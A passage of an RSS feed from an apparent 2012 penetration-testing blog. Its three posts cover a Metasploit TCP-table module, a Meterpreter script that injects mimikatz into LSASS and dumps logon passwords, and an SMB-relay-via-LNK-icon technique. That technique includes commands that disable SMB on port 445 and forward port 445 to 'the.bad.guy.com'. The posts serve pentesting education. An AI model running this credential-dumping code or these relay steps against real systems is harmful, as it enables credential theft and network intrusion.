&lt;p&gt;Added to trunk: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb&#34;&gt;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I promised this one a while ago, sorry for the delay. This only does TCP, it&amp;rsquo;d be trivial to do UDP as well but never really found anything interesting and actively going on on the UDP side. It&amp;rsquo;s real simple, first we&amp;rsquo;ve gotta add the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366026%28v=vs.85%29.aspx&#34;&gt;GetTcpTable&lt;/a&gt; function to railgun:&lt;/p&gt;

&lt;p&gt;session.railgun.add_function(&amp;lsquo;iphlpapi&amp;rsquo;, &amp;lsquo;GetTcpTable&amp;rsquo;, &amp;lsquo;DWORD&amp;rsquo;, [&lt;/p&gt;

&lt;p&gt;[&amp;lsquo;PBLOB&amp;rsquo;, &amp;lsquo;pTcpTable&amp;rsquo;, &amp;lsquo;out&amp;rsquo;],&lt;/p&gt;

&lt;p&gt;[&amp;lsquo;PDWORD&amp;rsquo;, &amp;lsquo;pdwSize&amp;rsquo;, &amp;lsquo;inout&amp;rsquo;],&lt;/p&gt;

&lt;p&gt;[&amp;lsquo;BOOL&amp;rsquo;, &amp;lsquo;bOrder&amp;rsquo;, &amp;lsquo;in&amp;rsquo;]&lt;/p&gt;

&lt;p&gt;])&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Then gauge the size of the table:&lt;/p&gt;

&lt;p&gt;getsize = session.railgun.iphlpapi.GetTcpTable(4,4,true)&lt;/p&gt;

&lt;p&gt;buffersize = getsize[&amp;lsquo;pdwSize&amp;rsquo;]&lt;/p&gt;

&lt;p&gt;Run the call again with the correct buffer size:&lt;/p&gt;

&lt;p&gt;tcptable = session.railgun.iphlpapi.GetTcpTable(buffersize,buffersize,true)&lt;/p&gt;

&lt;p&gt;Then it&amp;rsquo;s all just parsing the result. Also pretty straight forward. First we get the number of entries which is held in the first 4 bytes, then just parse the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366917%28v=vs.85%29.aspx&#34;&gt;MIB_TCPTABLE&lt;/a&gt; one &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366909%28v=vs.85%29.aspx&#34;&gt;MIB_TCPROW&lt;/a&gt; at a time (translating the state to something readable):&lt;/p&gt;

&lt;p&gt;def parse_tcptable(buffer)&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;  entries = buffer[0,4].unpack(&amp;ldquo;V*&amp;ldquo;)[0]&lt;/p&gt;

&lt;p&gt;  print_status(&amp;ldquo;Total TCP Entries: #{entries}&amp;ldquo;)&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;  rtable = Rex::Ui::Text::Table.new(&lt;/p&gt;

&lt;p&gt;    &amp;lsquo;Header&amp;rsquo; =&amp;gt; &amp;lsquo;Routing Table&amp;rsquo;,&lt;/p&gt;

&lt;p&gt;    &amp;lsquo;Indent&amp;rsquo; =&amp;gt; 2,&lt;/p&gt;

&lt;p&gt;    &amp;lsquo;Columns&amp;rsquo; =&amp;gt; [&amp;lsquo;STATE&amp;rsquo;, &amp;lsquo;LHOST&amp;rsquo;, &amp;lsquo;LPORT&amp;rsquo;, &amp;lsquo;RHOST&amp;rsquo;, &amp;lsquo;RPORT&amp;rsquo;]&lt;/p&gt;

&lt;p&gt;  )&lt;/p&gt;

&lt;p&gt;  offset = 4&lt;/p&gt;

&lt;p&gt;  (1..entries).each do&lt;/p&gt;

&lt;p&gt;    x = {}&lt;/p&gt;

&lt;p&gt;    x[:state] = case buffer[(offset + 0), 4].unpack(&amp;ldquo;V*&amp;ldquo;)[0]&lt;/p&gt;

&lt;p&gt;      when 1&lt;/p&gt;

&lt;p&gt;        &amp;lsquo;CLOSED&amp;rsquo;&lt;/p&gt;

&lt;p&gt;      when 2&lt;/p&gt;

&lt;p&gt;        &amp;lsquo;LISTEN&amp;rsquo;&lt;/p&gt;

&lt;p&gt;      when 3&lt;/p&gt;

&lt;p&gt;        &amp;lsquo;SYN_SENT&amp;rsquo;&lt;/p&gt;

&lt;p&gt;      when 4&lt;/p&gt;

&lt;p&gt;        &amp;lsquo;SYN_RCVD&amp;rsquo;&lt;/p&gt;

&lt;p&gt;      when 5&lt;/p&gt;

&lt;p&gt;        &amp;lsquo;ESTABLISHED&amp;rsquo;&lt;/p&gt;

&lt;p&gt;      when 6&lt;/p&gt;

&lt;p&gt;        &amp;lsquo;FIN_WAIT1&amp;rsquo;&lt;/p&gt;

&lt;p&gt;      when 7&lt;/p&gt;

&lt;p&gt;        &amp;lsquo;FIN_WAIT2&amp;rsquo;&lt;/p&gt;

&lt;p&gt;      when 8&lt;/p&gt;

&lt;p&gt;        &amp;lsquo;CLOSE_WAIT&amp;rsquo;&lt;/p&gt;

&lt;p&gt;      when 9&lt;/p&gt;

&lt;p&gt;        &amp;lsquo;CLOSING&amp;rsquo;&lt;/p&gt;

&lt;p&gt;      when 10&lt;/p&gt;

&lt;p&gt;        &amp;lsquo;LAST_ACK&amp;rsquo;&lt;/p&gt;

&lt;p&gt;      when 11&lt;/p&gt;

&lt;p&gt;        &amp;lsquo;TIME_WAIT&amp;rsquo;&lt;/p&gt;

&lt;p&gt;      when 12&lt;/p&gt;

&lt;p&gt;        &amp;lsquo;DELETE_TCB&amp;rsquo;&lt;/p&gt;

&lt;p&gt;      else&lt;/p&gt;

&lt;p&gt;        &amp;lsquo;UNDEFINED&amp;rsquo;&lt;/p&gt;

&lt;p&gt;      end&lt;/p&gt;

&lt;p&gt;    x[:lhost] = Rex::Socket.addr_itoa(buffer[(offset + 4), 4].unpack(&amp;ldquo;N&amp;rdquo;)[0])&lt;/p&gt;

&lt;p&gt;    x[:lport] = buffer[(offset + 8), 4].unpack(&amp;ldquo;n&amp;rdquo;)[0]&lt;/p&gt;

&lt;p&gt;    x[:rhost] = Rex::Socket.addr_itoa(buffer[(offset + 12), 4].unpack(&amp;ldquo;N&amp;rdquo;)[0])&lt;/p&gt;

&lt;p&gt;    if x[:state] == &amp;ldquo;LISTEN&amp;rdquo;&lt;/p&gt;

&lt;p&gt;      x[:rport] = &amp;ldquo;_&amp;rdquo;&lt;/p&gt;

&lt;p&gt;    else&lt;/p&gt;

&lt;p&gt;    x[:rport] = buffer[(offset + 16), 4].unpack(&amp;ldquo;n&amp;rdquo;)[0]&lt;/p&gt;

&lt;p&gt;    end&lt;/p&gt;

&lt;p&gt;  offset = offset + 20&lt;/p&gt;

&lt;p&gt;  rtable &amp;lt;&amp;lt; [x[:state], x[:lhost], x[:lport], x[:rhost], x[:rport]]&lt;/p&gt;

&lt;p&gt;  end&lt;/p&gt;

&lt;p&gt;  print_status(rtable.to_s)&lt;/p&gt;

&lt;p&gt;end&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Integration of Mimikatz into Metasploit Stage1</title>
      <link>http://localhost:1313/post/2012/2012615integration-of-mimikatz-into-metasploit-stage1-html/</link>
      <pubDate>Fri, 15 Jun 2012 14:55:55 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/2012615integration-of-mimikatz-into-metasploit-stage1-html/</guid>
      <description>&lt;p&gt;One of the powers of Metasploit is it&amp;rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.&lt;/p&gt;

&lt;p&gt;Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we&amp;rsquo;ll get there in the subsequent posts.&lt;/p&gt;

&lt;p&gt;Ignore the do_cmd for now and I stepped through &lt;a href=&#34;http://localhost:1313/blog/2011/5/30/remote-dll-injection-with-meterpreter.html&#34;&gt;remote DLL injection here&lt;/a&gt;. So the first odd lines is &lt;/p&gt;

&lt;p&gt;handle = client.railgun.kernel32.CreateNamedPipeW(&amp;rsquo;\.\pipe\kiwi\mimikatz&amp;rsquo;, &amp;lsquo;PIPE_ACCESS_DUPLEX&amp;rsquo;, &amp;lsquo;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&amp;rsquo;, 1, 0, 0, 30000,nil)[&amp;lsquo;return&amp;rsquo;]&lt;/p&gt;

&lt;p&gt;connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Essentially these connect to the &lt;a href=&#34;http://en.wikipedia.org/wiki/Named_pipe&#34;&gt;Named Pipe&lt;/a&gt; that the sekurlsa.dll uses to talk to the mimikatz.exe in it&amp;rsquo;s normal operation. Then we just use the windows API call &amp;ldquo;ReadFile&amp;rdquo; from there on out.&lt;/p&gt;

&lt;p&gt;client.railgun.kernel32.ReadFile(handle,248,248,4,nil)&lt;/p&gt;

&lt;p&gt;One of the draw backs to doing this all remotely is that Railgun doesn&amp;rsquo;t have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is  a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I&amp;rsquo;ve overcome this for the initial &amp;ldquo;banner&amp;rdquo; that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like &amp;ldquo;ping&amp;rdquo; and &amp;ldquo;getLogonPasswords&amp;rdquo; I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)&lt;/p&gt;

&lt;p&gt;If you have any questions on how/why this works or have a better way please leave your comments and questions below or hit me up on twitter!&lt;/p&gt;

&lt;p&gt;Meterpreter Script:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;def do_cmd(handle,cmd)
    ucommand = Rex::Text.to_unicode(cmd)
    sendcmd = client.railgun.kernel32.WriteFile(handle,ucommand,ucommand.size,4,nil)
    good2go = false
    newline = false
    readstring = []
    while good2go == false
        # Have to pull data 1 unicode character at a time
        # this is because the pipe won&#39;t write or read if
        # too much was written or read by the &amp;quot;client&amp;quot; (us)
        pull = client.railgun.kernel32.ReadFile(handle,2,2,4,nil)
        # Check to see if our end of read check is there: n000 @00
        if pull[&#39;lpBuffer&#39;] == &amp;quot;@00&amp;quot; and newline == true
            good2go = true
        else
            readstring &amp;lt;&amp;lt; pull[&#39;lpBuffer&#39;]
        end

        # Ready the newline var for previous check on next loop
        if pull[&#39;lpBuffer&#39;] == &amp;quot;n00&amp;quot;
            newline = true
        else
            newline = false
        end
    end

    print_status(readstring.join(&amp;quot;&amp;quot;))
end

print_status(&amp;quot;x86 Detected - Using x86 mimikatz&amp;quot;)
handle = client.railgun.kernel32.CreateNamedPipeW(&#39;\\.\pipe\kiwi\mimikatz&#39;, &#39;PIPE_ACCESS_DUPLEX&#39;, &#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;, 1, 0, 0, 30000,nil)[&#39;return&#39;]
print_status(&amp;quot;Handle: #{handle}&amp;quot;)
framework.threads.spawn(&#39;injectlsass&#39;,false) {
    pid = client.sys.process[&#39;lsass.exe&#39;]
    print_status(&amp;quot;LSASS located at PID: #{pid}&amp;quot;)
    pathtomimi = &amp;quot;C:\sekurlsa.dll&amp;quot;

    pay = client.framework.payloads.create(&amp;quot;windows/loadlibrary&amp;quot;)
    pay.datastore[&amp;quot;DLL&amp;quot;] = pathtomimi
    pay.datastore[&amp;quot;EXITFUNC&amp;quot;] = &#39;thread&#39;

    raw = pay.generate
    targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
    mem = targetprocess.memory.allocate(raw.length + (30024))
    targetprocess.memory.write(mem, raw)
    sleep(2)
    targetprocess.thread.create(mem, 0)
    print_status(&amp;quot;Successfully Injected into LSASS&amp;quot;)
}
print_status(&amp;quot;Waiting for LSASS injection to complete&amp;quot;)
connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
print_status(&amp;quot;Mimikatz has called home, ready for command&amp;quot;)
sleep(2)
print_status(&amp;quot;Reading banner&amp;quot;)
client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
print_status(&amp;quot;Doing a quick ping to make sure things are working...&amp;quot;)
do_cmd(handle,&#39;ping&#39;)
print_status(&amp;quot;If you made it this far it worked, doing getLogonPasswords&amp;quot;)
do_cmd(handle, &#39;getLogonPasswords&#39;)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>MS08_068 &#43; MS10_046 = FUN UNTIL 2018</title>
      <link>http://localhost:1313/post/2012/2012211ms08_068-ms10_046-fun-until-2018-html/</link>
      <pubDate>Sat, 11 Feb 2012 08:29:37 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/2012211ms08_068-ms10_046-fun-until-2018-html/</guid>
      <description>&lt;p&gt;*&lt;strong&gt;&lt;em&gt;TL;DR:&lt;/em&gt;&lt;/strong&gt;* SMB Relay + LNK UNC icons = internal pentest pwnage&lt;/p&gt;

&lt;p&gt;I need to touch on the highlights of two vulnerabilities before we talk about the fun stuff, but I highly encourage you to read the references at the bottom of this post and understand the vulnerabilities after you are done with my little trick, as you might find one of your own.&lt;/p&gt;

&lt;p&gt;*&lt;strong&gt;&lt;em&gt;MS08_068:&lt;/em&gt;&lt;/strong&gt;* &lt;a href=&#34;http://www.cvedetails.com/cve/CVE-2008-4037/&#34;&gt;http://www.cvedetails.com/cve/CVE-2008-4037/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In 2008, Microsoft released MS08_068 which patched the &amp;ldquo;SMB Relay&amp;rdquo; attack. To boil this down, an attacker gets a victim to attempt to authenticate to an attacker controlled box. The attack delays its responses to the victim and replays the important parts of the authentication that the victim sent back at the victim. You can find out a lot more about this vulnerability here: &lt;a href=&#34;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&#34;&gt;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;One thing to take away from that post is that the patch stops Attacker &amp;lt;=&amp;gt; Victim, but does not / cannot fix Victim &amp;lt;=&amp;gt; Attacker &amp;lt;=&amp;gt; &lt;strong&gt;Victim2&lt;/strong&gt; (use authentication from Victim to replay to Victim2)&lt;/p&gt;

&lt;p&gt;**&lt;strong&gt;MS10_046&lt;/strong&gt;:** &lt;a href=&#34;http://www.cvedetails.com/cve/CVE-2010-2568/&#34;&gt;http://www.cvedetails.com/cve/CVE-2010-2568/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In 2010, Microsoft released MS10_046 which patched the Stuxnet LNK vulnerability where a malicious DLL could be loaded (locally or remotely over WebDAV) using the path of the shortcut&amp;rsquo;s icon reference. LNK files are Windows shortcut files that allow the icons of the files to be changed much more dynamically than any other file type (Right click a shortcut, go to Properties, and just simply click the &amp;lsquo;Change Icon&amp;rsquo; button). I could certainly be wrong here, but I believe all Microsoft patched was the ability to use this feature to load the DLLs via a certain Control Panel object. Which leaves the ability to load shortcut (LNK) icons from wherever we wish. ;-)&lt;/p&gt;

&lt;p&gt;**&lt;strong&gt;The Setup&lt;/strong&gt;:**&lt;/p&gt;

&lt;p&gt;If you are on an internal penetration test and either exploit a machine or find an open share, you can create an LNK file with an icon that points at a nonexistent share on your attacking machine&amp;rsquo;s IP and use SMB_Relay to replay those credentials to a system in which we&amp;rsquo;ve identified by one means or another as an &amp;lsquo;important&amp;rsquo; host to get on.&lt;/p&gt;

&lt;p&gt;Attacker uploads malicious LNK file to network share on &lt;strong&gt;FILE SHARE&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Victim views it on &lt;strong&gt;WORKSTATION&lt;/strong&gt; that initiates an connection to &lt;strong&gt;ATTACKER&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Attacker relays those authentication attempts to &lt;strong&gt;FILE SHARE&lt;/strong&gt;, gaining code execution if &amp;lsquo;Victim&amp;rsquo; is an admin on &lt;strong&gt;FILE SHARE&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If not, then NetNTLM are still visible in the logs and can be attempted to crack, or just wait for more people to view the LNK file on the public share, and hope that an admin comes by at some point.&lt;/p&gt;

&lt;p&gt;Your mileage will vary based on where you put the LNK file.&lt;/p&gt;

&lt;p&gt;**&lt;strong&gt;The Video&lt;/strong&gt;:**&lt;/p&gt;

&lt;p&gt;[youtube &lt;a href=&#34;http://www.youtube.com/watch?v=FxekUPY5ojU&#34;&gt;http://www.youtube.com/watch?v=FxekUPY5ojU&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;I have created a post module to automate the process of creating and uploading the LNK file (so you don&amp;rsquo;t have to have a Windows box lying around). Here it is in action:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Module options (post/windows/escalate/droplnk):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   ICONFILENAME  icon.png         yes       File name on LHOST&#39;s share
   LHOST         192.168.2.16     yes       Host listening for incoming SMB/WebDAV traffic
   LNKFILENAME   Words.lnk        yes       Shortcut&#39;s filename
   SESSION       1                yes       The session to run this module on.
   SHARENAME     share1           yes       Share name on LHOST

2012-02-11 07:17:19 +0000 2 1 post(droplnk) &amp;gt; run

[*] Creating evil LNK
[*] Done. Writing to disk - C:DocuMe~1Administrator\Words.lnk
[*] Done. Wait for evil to happen..
[*] Post module execution completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can find the code here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/mubix/Not-In-Pentesting-Class/blob/master/modules/post/mubix/droplnk.rb&#34;&gt;https://github.com/mubix/Not-In-Pentesting-Class/blob/master/modules/post/mubix/droplnk.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Going forward:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Obviously this isn&amp;rsquo;t so effective remotely out of the box and there currently isn&amp;rsquo;t a SMB_Relay for WebDAV (although I&amp;rsquo;m guessing that would work). However I was able to construct a crude way getting smb_relaying working using some pretty loud system changes to an exploited host:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;*&lt;strong&gt;&lt;em&gt;Step 1&lt;/em&gt;&lt;/strong&gt;*: Disable SMB on Port 445 (it will still operate on 139 as it is a failover), this setting requires a reboot to take effect and can be done using the following command:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;reg add HKLMSystemCurrentControlSetServicesNetBTParameters /v SMBDeviceEnabled /t REG_DWORD /d 0&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;*&lt;strong&gt;&lt;em&gt;Step 2&lt;/em&gt;&lt;/strong&gt;*: Port forward the traffic out to your remote attacker host over a port that is allowed out, used 80:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;em&gt;netsh int portproxy v4tov4 listenport=445 connectaddress=the.bad.guy.com connectport=80&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;*&lt;strong&gt;&lt;em&gt;Step 3&lt;/em&gt;&lt;/strong&gt;*: Set up SMB_Relay listening on that port on your attacker with a route in meterpreter to send all relayed authentication through your meterpreter session into and at the targeted host.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These steps can get you noticed in almost every way, so it&amp;rsquo;s not recommended, I just did it as a PoC. I mean how cool is it to remotely exploit SMB vulns ;-)&lt;/p&gt;

&lt;p&gt;The other thing is, administrators are becoming much more rare as years move along and people use lower priv users for their daily tasks, so there are currently feature requests in to the Metasploit project to make it so when you get SMB_Relay correctly forwarding good credentials, even if they aren&amp;rsquo;t admin and you cannot get code execution it would be nice to be able to go through the files that person has access to on the targeted system / file share. A final pipe dream of this post is to have a multi-threaded smb_relay that 2, 3 or even 10 servers can be targeted with the relayed authentication.&lt;/p&gt;

&lt;p&gt;just saying&amp;rsquo;…. /me nudges the Metasploit devs…&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;SMB_Relay References:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&amp;ldquo;Initial?&amp;rdquo; release in 2003 - &lt;a href=&#34;http://www.xfocus.net/articles/200305/smbrelay.html&#34;&gt;http://www.xfocus.net/articles/200305/smbrelay.html&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Microsoft advisory - &lt;a href=&#34;http://technet.microsoft.com/en-us/security/bulletin/ms08-068&#34;&gt;http://technet.microsoft.com/en-us/security/bulletin/ms08-068&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Metasploit blog post - &lt;a href=&#34;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&#34;&gt;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Metasploit module - &lt;a href=&#34;http://www.metasploit.com/modules/exploit/windows/smb/smb_relay&#34;&gt;http://www.metasploit.com/modules/exploit/windows/smb/smb_relay&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;LNK DLL Loader References:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Microsoft advisory - &lt;a href=&#34;http://technet.microsoft.com/en-us/security/advisory/2286198&#34;&gt;http://technet.microsoft.com/en-us/security/advisory/2286198&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Metasploit blog post - &lt;a href=&#34;https://community.rapid7.com/community/infosec/blog/2010/08/05/ms10-046-a-rude-awakening&#34;&gt;https://community.rapid7.com/community/infosec/blog/2010/08/05/ms10-046-a-rude-awakening&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Some of HDM&amp;rsquo;s research - &lt;a href=&#34;https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws&#34;&gt;https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ISS&amp;rsquo;s advisory - &lt;a href=&#34;http://blogs.iss.net/archive/remotedllpreloadingv.html&#34;&gt;http://blogs.iss.net/archive/remotedllpreloadingv.html&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Metasploit module - &lt;a href=&#34;http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader&#34;&gt;http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Video of the module in action - &lt;a href=&#34;http://www.commonexploits.com/?p=151&#34;&gt;http&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.commonexploits.com/?p=151&#34;&gt;://www.commonexploits.com/?p=151&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
  </channel>
</rss>